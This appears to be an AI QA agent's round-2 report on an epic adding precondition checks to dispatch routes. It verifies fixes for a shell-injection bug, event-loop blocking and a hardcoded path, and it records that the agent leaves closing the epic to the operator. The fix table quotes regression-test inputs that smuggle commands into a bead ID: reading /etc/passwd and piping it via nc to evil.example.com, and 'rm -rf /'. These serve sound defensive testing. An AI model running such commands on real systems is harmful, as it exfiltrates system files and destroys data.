# QA Report: beads_web-ehp (Action route precondition checks) — Round 2

## Round-numbering decision

The orchestrator prompt specified `QA round: 1`, but a complete round-1 QA already exists at `.beads/qa/beads_web-ehp-round-1.md` (commit `fc3bce7`, verdict FAIL, 3 bugs filed). The epic notes state "Ready for QA round 2 re-verification" after wave-6 fix-wave (commits `384f832` + `45badaa` + `bf169b6`). Treating this as round 2 to preserve the round-1 record. The orchestrator's `round 1` instruction is interpreted as stale (off-by-one).

## Summary
- **Flows verified:** 3 (action route HTTP path; reconciler-rule act() path; agent-launcher dispatchChainAction inline path) — all confirmed unchanged-and-clean since round 1 verification.
- **Personas verified:** 2 (operator dispatch via dashboard; reconciler tick auto-dispatch).
- **Round-1 bug fixes verified:** 3/3 (hfw shell-injection; q8w event-loop blocking; cqe hardcoded path) + 1 follow-on test-regression (rzt) cleared.
- **Round-2 tier checks:** concurrency / partial-failure / idempotency / resource-leak / TOCTOU — clean within this epic's scope.
- **Bugs filed:** 0.
- **Verdict:** PASS.

## Round-1 Fix Verification

| Bug | Round-1 finding | Round-2 verification |
|-----|-----------------|----------------------|
| beads_web-hfw (P1) | `bead-status-reader.ts:106` used `execSync(\`${bd} show ${beadId} --json\`)` — shell-string interpolation = injection vector | `bead-status-reader.ts:114` now calls `await execFileAsync(bd, ["show", beadId, "--json"], {...})` — argv-based `execFile` via `promisify`. No `/bin/sh`, no shell interpretation. Regression tests at `__tests__/lib/bead-status-reader.test.ts:411-450` assert malicious bead IDs (`"foo; cat /etc/passwd | nc evil.example.com 1234 $(whoami) \`id\`"`, `"foo\nrm -rf /"`) pass through verbatim as a single argv literal. PASS. |
| beads_web-q8w (P1) | Async-declared `readBeadStatus` used blocking `execSync` → stalls Node event loop up to 15s per dispatch | Same fix as hfw — `execFileAsync = promisify(execFile)` is genuinely non-blocking inside the `async` signature. PASS. |
| beads_web-cqe (P2) | `route.ts:496` hardcoded `/Users/janemckay/dev/claude_projects/beads_web` literal | `route.ts:495-504` removes the literal entirely; resolves cross-repo epics via `findRepoForIssue(epicId)` (parallel registry probe in `repo-config.ts:265-281`). On null/error fallback: defers to `fleetCorePath` and lets ADR-002 fail-closed (`BD_READ_FAILED`) handle wrong-cwd reads. PASS. |
| beads_web-rzt (P1, follow-on) | After hfw/q8w fix (commit `384f832`), the test mock still targeted `execSync` → 16/24 tests RED + missing shell-injection regression test | Mock pattern updated to callback-style execFile + `promisify.custom` symbol (matches `pipeline-labels.test.ts:22-31`). 26/26 tests in this file pass; full suite 117 suites / 2355 tests pass per commit `45badaa`'s close note. Two new shell-injection regression tests added per hfw AC. PASS. |

## Flow Verification Results (carry-forward verification)

### Flow 1: Action route → preconditions → label mutation → agent launch (Seam 4)
- **Status:** PASS. `checkPreconditionsOrRefuse` is invoked at the TOP of every dispatching case body (28+ verified call sites in `route.ts`, e.g. lines 618/725/882/931/952/2258/2583/2632/2679/3026/3119). Refused dispatches return HTTP 412 with `PreconditionRefusalResponse` body before any `addLabelsToEpic` / `removeAllPipelineLabels` / `launchAgent` call.
- **Issues:** None.

### Flow 2: Reconciler-rule act() → preconditions → action route 412 path (Seam 5)
- **Status:** PASS. All 6 dispatching reconciler rules integrate the gate (marker-driven-routing.ts:400-423; stuck-in-stage.ts:432; wave-bead-mismatch.ts:285; missed-wave-review-dispatch.ts:456; repeat-dispatch-escalation.ts:309; repeated-qa-round.ts:320). Each rule pre-gates with `evaluatePreconditions` and post-gates on HTTP 412.
- **Issues:** None.

### Flow 3: agent-launcher dispatchChainAction inline → preconditions
- **Status:** PASS. `agent-launcher.ts:2169-2192` builds context, evaluates, on refusal logs + emits `reconciler-action-refused` event + returns false (preserves existing fall-through semantics). 412 handling at line 2219+.
- **Issues:** None.

## Round-2 Tier Checks (concurrency, partial failure, idempotency, resource leaks, TOCTOU)

Scope: bugs that pass round 1 because the code looks right in isolation but fails under concurrent or partial-failure conditions. Limited to surfaces introduced or materially changed by this epic.

| Check | Site within epic scope | Verdict |
|-------|------------------------|---------|
| Race conditions in concurrent code | `buildDispatchContext` — uses `Promise.all` over independent readers (`readBeadStatus` / `readMarker` / `getEpicLabels` / `readPlanFileMeta` / `safeListOpenWaveBeads` / `safeListAllStatusWaveBeads`); no shared mutable state. Predicates are pure functions on a snapshot. | CLEAN |
| Partial failure handling | Each reader has its own try/catch returning null/empty (`bead-status-reader.ts:121-123`; `marker-reader.ts:139-152`; `safeListOpenWaveBeads` / `safeListAllStatusWaveBeads`); no propagating exceptions from the aggregator. | CLEAN |
| Idempotency | `evaluatePreconditions` is pure on a `DispatchContext` snapshot; multiple invocations produce identical verdicts. | CLEAN |
| Resource leaks | `execFile` timeout kills subprocess via SIGTERM (Node default). Reconciler-rule fetches use `AbortController` + `setTimeout` cleared in `finally` (e.g. marker-driven-routing.ts:487-489). MySQL connections in `probeRepoForIssue` close in `finally` (`repo-config.ts:238-240`). | CLEAN |
| Time-of-check vs time-of-use | `checkPreconditionsOrRefuse` reads state, then the case body mutates labels and launches agents. A race between two concurrent dispatches against the same epic could pass both checks before either mutation lands. **Pre-existing concern in route.ts dispatch flow (NOT introduced by this epic) and overlaps with `beads_web-a6o` (single-pipeline invariant).** Not filed against ehp. | OUT-OF-SCOPE |
| Partial failure (`addLabelsToEpic` succeeds, `launchAgent` throws) | Pre-existing concern overlapping with `beads_web-07p` (silent dispatch observability). Not introduced by this epic. | OUT-OF-SCOPE |

## Architecture Failure-Mode Verification (Step 4.5 — re-verified)

| Seam | Failure mode | Status |
|------|--------------|--------|
| 1: bd CLI | bd unreachable → null bead → `BD_READ_FAILED` (ADR-002) | PASS |
| 2: marker file | missing/unreadable → null marker → action-classified | PASS |
| 3: filesystem (plan file) | ENOENT → exists=false; other fs errors → exists=false + warn (Seam 3 fail-closed) | PASS |
| 4: route → label mutation → agent launch | precondition before mutation/launch | PASS |
| 5: rule → route 412 (double-gate) | rule pre-gate AND route post-gate | PASS |

## Common Pitfall Checks (Round 1 — re-verified after fixes)
- [x] No hardcoded credentials.
- [x] Error handling for external calls.
- [x] No infinite loops or unbounded recursion.
- [x] Configuration externalised — round-1 hardcoded `/Users/janemckay/dev/claude_projects/beads_web` literal removed (cqe).
- [x] Edge cases handled at obvious boundaries.
- [x] Logging exists for critical operations — structured warn-logs on every refusal path; `reconciler-action-refused` events emitted.
- [x] Shell-safe child-process invocation — `execFile` (argv) replaces `execSync` (shell-string) (hfw).
- [x] Async I/O vs event-loop blocking — `promisify(execFile)` is non-blocking (q8w).
- [x] Test-mock parity with implementation — `bead-status-reader.test.ts` mocks updated to `execFile` shape; shell-injection regression tests in place (rzt).

## Round-Boundary Signal-to-Noise (Step 7.5)

This round files 0 bugs. Duplication ratio with round 1: 0% (all 3 round-1 bugs are CLOSED with verifiable fixes; no recurrences). N/A — no findings to compare.

## STOP-and-Surface Check (Step 6.5 / surfacing-protocol § 2.4)

- **Failure mode 1 (bug from prior round reappears):** No. All 3 round-1 bugs (hfw, q8w, cqe) plus the wave-6 follow-on (rzt) are closed; static analysis confirms the fixes are in place and the regression tests guard against return.
- **Failure mode 2 (flow not verifiable end-to-end):** No. All 3 flows verified by static code reading; integration tests at `__tests__/integration/niii-phantom-dispatch-reproduction.test.ts` cover the 6 niii phantom-dispatch scenarios end-to-end.
- **Failure mode 3 (cross-round systemic pattern):** No. Round-1 findings clustered in one file (bead-status-reader.ts) plus one route.ts line — they share a "supporting infrastructure built without a regression test net" pattern, which is captured in the wave-6 fix (rzt added the missing test net). Single-cause-pattern resolved.

No surfacing triggered.

## Platform-Specific Checks

`standards/platforms/internal/` exists but contains no `qa-testing.md`. No platform-specific checks applied.

## Bugs Filed

None. Verdict PASS.

## Verdict

**PASS** — Zero open bugs for the epic (`bd list --status=open --type=bug --label epic:beads_web-ehp` returns no issues). Round-1 findings are fully addressed: hfw + q8w fixed by `execFile` migration with regression tests; cqe fixed by registry-lookup substitution; rzt (the wave-6 follow-on) cleared. Round-2 tier checks within this epic's scope are clean. The epic's stated AC (Class A/A.5/B/C/D/E predicates with structured refusal across 3 dispatch sites) remains implemented and verified at predicate, integration, and end-to-end (niii reproduction) layers.

Per the QA agent contract, the QA agent does NOT close the epic; the operator/closing agent should invoke `tools/generic/epic-close-gate.sh beads_web-ehp` per the close protocol.
